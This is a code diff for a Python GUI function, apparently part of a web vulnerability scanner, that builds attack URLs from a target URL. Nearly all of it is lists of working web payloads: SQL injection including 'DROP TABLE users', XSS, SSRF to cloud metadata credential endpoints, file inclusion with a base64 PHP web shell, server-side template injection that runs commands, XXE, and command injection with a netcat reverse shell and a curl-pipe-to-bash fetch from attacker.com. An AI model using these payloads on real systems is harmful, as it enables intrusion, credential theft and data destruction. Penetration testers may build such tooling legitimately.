@@ -868,79 +868,189 @@ Payload: {finding.get('payload')}
         self.exploit_text.insert(tk.END, content)
     
     def _generate_full_url_payloads(self, base_url, vuln_type):
-        """Generate full URLs with payloads injected"""
-        # Parse URL to inject payloads properly
+        """Generate dynamic, context-aware URLs with payloads injected"""
         from urllib.parse import urlparse, parse_qs, urlencode
+        import random
         
         parsed = urlparse(base_url)
         base_path = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
         
+        # Extract existing parameters from URL
+        existing_params = parse_qs(parsed.query)
+        param_names = list(existing_params.keys()) if existing_params else ['id', 'q', 'search', 'param']
+        
+        # Use first param or generate common ones
+        main_param = param_names[0] if param_names else 'id'
+        
         examples = []
         
         if 'SQL' in vuln_type:
-            examples = [
-                f"{base_path}?id=1' OR 1=1--",
-                f"{base_path}?id=1' UNION SELECT username,password FROM users--",
-                f"{base_path}?search=admin' --",
-                f"{base_path}?id=1' AND SLEEP(5)--",
-                f"{base_path}?user=admin' OR '1'='1"
+            # Dynamic SQL injection payloads based on context
+            sql_payloads = [
+                f"1' OR 1=1--",
+                f"admin'--",
+                f"1' UNION SELECT username,password FROM users--",
+                f"1' AND SLEEP(5)--",
+                f"admin' OR '1'='1",
+                f"1' UNION SELECT NULL,NULL,NULL--",
+                f"1' AND 1=2 UNION SELECT table_name FROM information_schema.tables--",
+                f"1'; DROP TABLE users--",
+                f"1' OR 'x'='x",
+                f"1' UNION SELECT @@version,NULL--"
             ]
+            
+            # Generate varied examples with different parameters
+            for i, payload in enumerate(random.sample(sql_payloads, min(5, len(sql_payloads)))):
+                param = random.choice(['id', 'user', 'search', 'q', 'username', main_param])
+                examples.append(f"{base_path}?{param}={payload}")
+                
         elif 'XSS' in vuln_type:
-            examples = [
-                f"{base_path}?q=<script>alert(1)</script>",
-                f"{base_path}?search=<img src=x onerror=alert(document.cookie)>",
-                f"{base_path}?name=<svg/onload=alert(1)>",
-                f"{base_path}?comment=\"><script>alert(1)</script>",
-                f"{base_path}?input=javascript:alert(1)"
+            # Dynamic XSS payloads with encoding variations
+            xss_payloads = [
+                "<script>alert(1)</script>",
+                "<img src=x onerror=alert(document.cookie)>",
+                "<svg/onload=alert(1)>",
+                "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+                "javascript:alert(1)",
+                "<iframe src=javascript:alert('XSS')>",
+                "<body onload=alert(1)>",
+                "<input onfocus=alert(1) autofocus>",
+                "<select onfocus=alert(1) autofocus>",
+                "<textarea onfocus=alert(1) autofocus>"
             ]
+            
+            for i, payload in enumerate(random.sample(xss_payloads, min(5, len(xss_payloads)))):
+                param = random.choice(['q', 'search', 'comment', 'name', 'input', main_param])
+                # URL encode some payloads
+                if i % 2 == 0:
+                    from urllib.parse import quote
+                    payload = quote(payload)
+                examples.append(f"{base_path}?{param}={payload}")
+                
         elif 'SSRF' in vuln_type:
-            examples = [
-                f"{base_path}?url=http://169.254.169.254/latest/meta-data/",
-                f"{base_path}?url=http://localhost:22",
-                f"{base_path}?url=file:///etc/passwd",
-                f"{base_path}?redirect=http://127.0.0.1:6379",
-                f"{base_path}?fetch=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+            # Dynamic SSRF targets
+            ssrf_targets = [
+                "http://169.254.169.254/latest/meta-data/",
+                "http://localhost:22",
+                "http://localhost:6379",
+                "file:///etc/passwd",
+                "http://127.0.0.1:8080",
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "http://metadata.google.internal/computeMetadata/v1/",
+                "http://169.254.169.254/latest/user-data",
+                "gopher://127.0.0.1:6379/_INFO",
+                "dict://127.0.0.1:11211/stat"
             ]
+            
+            for target in random.sample(ssrf_targets, min(5, len(ssrf_targets))):
+                param = random.choice(['url', 'redirect', 'fetch', 'proxy', 'link', main_param])
+                examples.append(f"{base_path}?{param}={target}")
+                
         elif 'LFI' in vuln_type or 'Path' in vuln_type:
-            examples = [
-                f"{base_path}?file=../../../../etc/passwd",
-                f"{base_path}?page=....//....//....//etc/shadow",
-                f"{base_path}?include=php://filter/convert.base64-encode/resource=index.php",
-                f"{base_path}?path=..\\..\\..\\..\\windows\\win.ini",
-                f"{base_path}?doc=/var/log/apache2/access.log"
+            # Dynamic LFI payloads with different traversal depths
+            lfi_payloads = [
+                "../../../../etc/passwd",
+                "....//....//....//etc/shadow",
+                "php://filter/convert.base64-encode/resource=index.php",
+                "..\\..\\..\\..\\windows\\win.ini",
+                "/var/log/apache2/access.log",
+                "../../../../proc/self/environ",
+                "php://input",
+                "expect://whoami",
+                "zip://shell.zip#shell.php",
+                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
             ]
+            
+            for payload in random.sample(lfi_payloads, min(5, len(lfi_payloads))):
+                param = random.choice(['file', 'page', 'include', 'path', 'doc', main_param])
+                examples.append(f"{base_path}?{param}={payload}")
+                
         elif 'Command' in vuln_type:
-            examples = [
-                f"{base_path}?cmd=; whoami",
-                f"{base_path}?exec=| cat /etc/passwd",
-                f"{base_path}?run=$(id)",
-                f"{base_path}?shell=; ls -la",
-                f"{base_path}?ping=127.0.0.1; nc attacker.com 4444 -e /bin/bash"
+            # Dynamic command injection with different separators
+            cmd_payloads = [
+                "; whoami",
+                "| cat /etc/passwd",
+                "$(id)",
+                "; ls -la",
+                "127.0.0.1; nc attacker.com 4444 -e /bin/bash",
+                "& dir",
+                "`whoami`",
+                "|| uname -a",
+                "; curl http://attacker.com/shell.sh | bash",
+                "& powershell -c Get-Process"
             ]
+            
+            for payload in random.sample(cmd_payloads, min(5, len(cmd_payloads))):
+                param = random.choice(['cmd', 'exec', 'run', 'shell', 'ping', main_param])
+                examples.append(f"{base_path}?{param}={payload}")
+                
         elif 'IDOR' in vuln_type:
-            examples = [
-                f"{base_path}?id=1 (try id=2, id=999)",
-                f"{base_path}?user_id=123 (try other IDs)",
-                f"{base_path}?document=abc123",
-                f"{base_path.replace('/user/', '/admin/')} (privilege escalation)"
+            # Dynamic IDOR examples with different ID formats
+            idor_examples = [
+                f"{base_path}?id=1 → Try: id=2, id=999, id=admin",
+                f"{base_path}?user_id=123 → Try: user_id=1, user_id=100",
+                f"{base_path}?document=abc123 → Try: document=xyz789",
+                f"{base_path.replace('/user/', '/admin/')} (privilege escalation)",
+                f"{base_path}?uuid=550e8400-e29b-41d4-a716-446655440000 → Try different UUIDs"
             ]
+            examples = idor_examples[:5]
+            
         elif 'SSTI' in vuln_type:
-            examples = [
-                f"{base_path}?template={{{{7*7}}}}",
-                f"{base_path}?name={{{{config}}}}",
-                f"{base_path}?input={{{{''.__class__.__mro__[1].__subclasses__()}}}}",
-                f"{base_path}?data=${{7*7}}"
+            # Dynamic SSTI payloads for different template engines
+            ssti_payloads = [
+                "{{7*7}}",  # Jinja2
+                "{{config}}",  # Flask
+                "{{''.__class__.__mro__[1].__subclasses__()}}",  # Python
+                "${7*7}",  # Freemarker
+                "#{7*7}",  # Ruby
+                "{{constructor.constructor('alert(1)')()}}",  # AngularJS
+                "{{''.class.mro()[1].subclasses()}}",  # Jinja2
+                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+                "${{<%[%'\"}}%\\",  # Polyglot
+                "{{config.items()}}"
             ]
+            
+            for payload in random.sample(ssti_payloads, min(5, len(ssti_payloads))):
+                param = random.choice(['template', 'name', 'input', 'data', 'msg', main_param])
+                examples.append(f"{base_path}?{param}={payload}")
+                
+        elif 'OAuth' in vuln_type or 'CSRF' in vuln_type:
+            # OAuth-specific payloads
+            oauth_payloads = [
+                f"{base_path}?redirect_uri=https://attacker.com/callback",
+                f"{base_path}?redirect_uri={parsed.scheme}://{parsed.netloc}@attacker.com",
+                f"{base_path}?client_id=test&response_type=code (missing state parameter)",
+                f"{base_path}?redirect_uri=javascript:alert(1)",
+                f"{base_path}/callback?code=STOLEN_CODE"
+            ]
+            examples = oauth_payloads
+            
+        elif 'XXE' in vuln_type:
+            # XXE payloads (for POST requests)
+            xxe_payloads = [
+                "POST with: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+                "POST with: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>",
+                "POST with: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
+                f"{base_path} (Send XML with external entity)",
+                f"{base_path} (Content-Type: application/xml)"
+            ]
+            examples = xxe_payloads
+            
         else:
-            # Generic examples
-            examples = [
-                f"{base_path}?param=malicious_payload",
-                f"{base_path}?id=1' OR 1=1--",
-                f"{base_path}?q=<script>alert(1)</script>",
-                f"{base_path}?file=../../../../etc/passwd"
+            # Generic dynamic payloads
+            generic_payloads = [
+                f"{base_path}?{main_param}=1' OR 1=1--",
+                f"{base_path}?{main_param}=<script>alert(1)</script>",
+                f"{base_path}?{main_param}=../../../../etc/passwd",
+                f"{base_path}?{main_param}=; whoami",
+                f"{base_path}?{main_param}={{{{7*7}}}}"
             ]
+            examples = generic_payloads
         
-        return "\n".join([f"- {url}" for url in examples])
+        # Add context-aware note
+        context_note = f"\n💡 TIP: Payloads are dynamically generated based on:\n   - URL structure: {base_path}\n   - Detected parameters: {', '.join(param_names) if param_names else 'None (using defaults)'}\n   - Vulnerability type: {vuln_type}\n"
+        
+        return context_note + "\n".join([f"- {url}" for url in examples])
 
     def copy_exploit(self):
         content = self.exploit_text.get(1.0, tk.END)
